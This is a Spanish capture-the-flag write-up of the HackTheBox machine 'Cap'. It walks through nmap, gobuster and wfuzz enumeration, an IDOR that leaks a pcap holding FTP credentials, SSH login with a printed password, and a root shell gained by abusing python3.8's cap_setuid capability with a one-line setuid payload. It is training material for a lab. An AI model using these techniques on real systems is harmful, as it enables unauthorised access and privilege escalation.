Maquina: Cap

Autor:

Dificultad: Facil

![Screenshot 2024-11-10 111524](https://github.com/user-attachments/assets/cf2ef35d-5faa-437e-a508-947c1639c15d)

Verificamos que la máquina está activa haciendo un ping.

ping -c 1 10.129.140.249 –R

![Screenshot 2024-11-10 111659](https://github.com/user-attachments/assets/950133a3-a0db-4605-8f9c-a3e283f306a5)

Vemos que el ping nos responde con el ttl de la máquina de 63, maquina Linux, que en realidad serían 64 pero HTB por la conexión con un nodo intermediario, lo reduce en 1 unidad.

Enumeración: Usamos Nmap para escanear y descubrir posibles vulnerabilidades. Aquí es donde la curiosidad se convierte en acción.

Sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.140.249 -oG Escaneo

![Screenshot 2024-11-10 111922](https://github.com/user-attachments/assets/be35e9a9-7f69-4385-850d-ba1d154a603f)

Una vez comprobado que la máquina está activa, vamos a lanzar un nmap con permisos de root para ver qué puertos están abiertos y exportar el resultado en un fichero llamado Escaneo.
Después el escaneo me devuelve que los puertos 21 ftp, 22 ssh y 80 http están abiertos.

Sabiendo que estos puertos están abiertos, lo que hacemos a continuación es lanzar un comando completo que recoja todo:
sudo nmap -sCV -p- --open --min-rate 5000 -n -vvv -Pn 10.129.140.249 -oG Scan 

![Screenshot 2024-11-10 112556](https://github.com/user-attachments/assets/1874e781-9e82-4a55-b36e-c2aa689057d8)

Explotación:

El puerto 80 es un panel admin

usamos gobuster

gobuster dir -u http://10.129.140.249/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 50

![Screenshot 2024-11-10 120056](https://github.com/user-attachments/assets/5f75b5dc-2652-4e9b-8630-e165d7dfac8a)

enumeramos /data con wfuzz

wfuzz -u http://10.129.140.249/data/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --hc 302,404

![Screenshot 2024-11-10 121157](https://github.com/user-attachments/assets/f8dbbe06-9035-42b5-a2a4-5c2f1fc888c8)

Ataque IDOR (Insecure Direct Object Reference)
Parece que la opción «Security Snapshot» de la izquierda 
(si haces hovering la ruta es /capture ) va cambiando y 
generando nuevas urls con la opción de poder Descargar esa información.

Probamos con incluir un valor directamente de cero en la ruta para ver la respuesta, y efectivamente nos devuelve información con la opción de descargarnos el informe, por lo que nos lo descargamos y lo analizamos para ver qué contiene.
Parece que modificando el valor de la ruta puedemos acceder a información que de forma natural de funcionamiento de la página no tendrías, por lo que estamos ante un posible ataque IDOR.

http://10.129.140.249/data/0

![Screenshot 2024-11-10 121242](https://github.com/user-attachments/assets/13e548c4-98e7-4ed4-b5da-e6b364e8226f)

nos bajamos el documento .pcap

![Screenshot 2024-11-10 121257](https://github.com/user-attachments/assets/3d9532f2-ab32-4fc6-8b41-ec6678b1f170)

Lo abrimos con wireshark y vemos que hay muchos ftp requests 

aplicamos el filtro para ver solo ftp requests y encontramos un username y un password

![Screenshot 2024-11-10 122357](https://github.com/user-attachments/assets/72d8d056-bce5-4838-879e-a63f31924ce4)

intentamos entrar por ftp

![Screenshot 2024-11-10 122533](https://github.com/user-attachments/assets/04c5f6d0-de58-4e2f-b284-3964d1232374)

dir

vemos que nathan tiene hdirectorio home, eso significa que podemos hacer loging por ssh tambien

ssh nathan@10.129.140.249
Buck3tH4TF0RM3!

![Screenshot 2024-11-10 122707](https://github.com/user-attachments/assets/f4794c4b-12e9-4852-ad31-e2f60ad95829)

ls

cat user.txt

![Screenshot 2024-11-10 122734](https://github.com/user-attachments/assets/32d8d458-c39f-4099-b985-69416f055078)

Sin embargo este usuario no tiene permisos de root en la máquina.

Escalada de privilegios: 
ESCALADA DE PRIVILEGIOS CON CAPABILITES
En este punto, vemos los permisos id y de sudoers por si ese usuario pudiera tener permisos especiales de ejecución como root, y parece que no.

Id

![Screenshot 2024-11-10 122804](https://github.com/user-attachments/assets/424ea4c3-8813-4bac-9452-5f2ecb161c51)

Teniendo eso en cuento vamos a ver si hay algún binario que nos permite abusar del privilegio de root.
Con esta línea vamos a buscar archivos con el bit SUID (Set User ID) activado. El valor 4000 representa este permiso especial en octal. Los archivos con este permiso se ejecutan con los privilegios de su propietario (root), incluso si quien los ejecuta es un usuario diferente.

find / -perm -4000 -user root 2>/dev/null

![Screenshot 2024-11-10 123605](https://github.com/user-attachments/assets/0a9c0f4c-1e1b-46be-bb9f-70d4f1fea9de)

Hay muchos pero son los comunes por lo que parece que no podemos abusar de ninguno.
Teniendo en cuenta que la máquina se llama «Cap» es posible que mediante la opción de Linux Capabilities podamos encontrarlas y vemos si un archivo vulnerable o mal configurado tiene el bit SUID activo y es propiedad de root, y así cualquier usuario como Nathan puede ejecutarlo con privilegios de root.

getcap -r / 2>/dev/null

![Screenshot 2024-11-10 123619](https://github.com/user-attachments/assets/e16d5af2-11fa-433b-9ef7-192343e926ba)

Si vemos la línea de python 3.8 , este archivo tiene las siguientes capabilities:
cap_net_bind_service: Permite que el archivo pueda asociarse a puertos de red por debajo del 1024, que normalmente requieren permisos de root.
cap_setuid: Permite que el archivo cambie su UID efectivo (identificador de usuario). Esto es importante porque podría usarse para cambiar de usuario, lo que en ciertos casos podría permitir la escalación de privilegios.
Posible riesgo: La combinación de estas capabilities significa que cualquier script o proceso que use python3.8 podría, en teoría, manipular puertos de red y cambiar su UID.

Linux Capabilities es un sistema más granular que permite asignar permisos específicos a un proceso en lugar de usar el sistema SUID, que otorga todos los permisos de root. Capabilities divide los permisos de root en unidades más pequeñas (capabilities), como CAP_NET_ADMIN para administración de red o CAP_SYS_MODULE para cargar módulos del kernel. Esto ayuda a mejorar la seguridad al evitar la necesidad de usar SUID en muchos casos.

Si ahora vamos a GTFObins en Python y Capabilities , podemos ver el CAP_SETUID que podemos aplicar para comprometer la máquina.

Ajustas la petición teniendo en cuenta lo anterior, y ya tendríamos permisos de root y podríamos acceder a la flag de root:

python3.8 -c 'import os; os.setuid(0); os.system("bash")’

![Screenshot 2024-11-10 123803](https://github.com/user-attachments/assets/9ab61011-d93b-4393-b5a8-4f1a850ba260)

whoami

Cd /root
ls
Cat root.txt

![Screenshot 2024-11-10 124030](https://github.com/user-attachments/assets/42b5f893-9da5-46d5-86d3-6b3367fbe5ad)

¡Pwned!













